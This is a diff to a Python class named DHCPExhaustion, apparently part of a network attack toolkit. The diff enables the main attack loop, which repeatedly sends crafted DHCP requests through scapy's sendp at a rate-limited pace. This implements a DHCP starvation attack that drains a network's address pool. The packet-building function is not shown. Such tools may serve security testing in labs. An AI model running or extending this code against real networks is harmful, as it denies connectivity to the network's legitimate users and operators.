@@ -42,19 +42,20 @@ class DHCPExhaustion(BaseAttack):
 
     def _send_loop(self):
         """Main attack loop with rate limiting"""
-        delay = 1 / self._rate_limit(self.num_devices // 10)
-        calculated_pps = self.num_devices  # Direct device count as PPS
-        allowed_pps = self._rate_limit(calculated_pps)
-        delay = 1 / allowed_pps
-        """ while self.running:
-            try:
+        try:
+            # Calculate safe packets per second
+            base_pps = max(1, self.num_devices)  # Ensure at least 1 pps
+            allowed_pps = self._rate_limit(base_pps)
+            delay = 1.0 / allowed_pps
+            
+            while self.running:
                 pkt = self._create_dhcp_packet()
                 sendp(pkt, iface=self.interface, verbose=False)
                 self.logger.info(f"Sent DHCP request from {pkt.src}")
                 time.sleep(delay)
-            except Exception as e:
-                self.logger.error(f"DHCP send error: {str(e)}")
-                self.stop() """
+        except Exception as e:
+            self.logger.error(f"DHCP loop error: {str(e)}")
+            self.stop()
 
     def start(self):
         """Launch attack thread"""
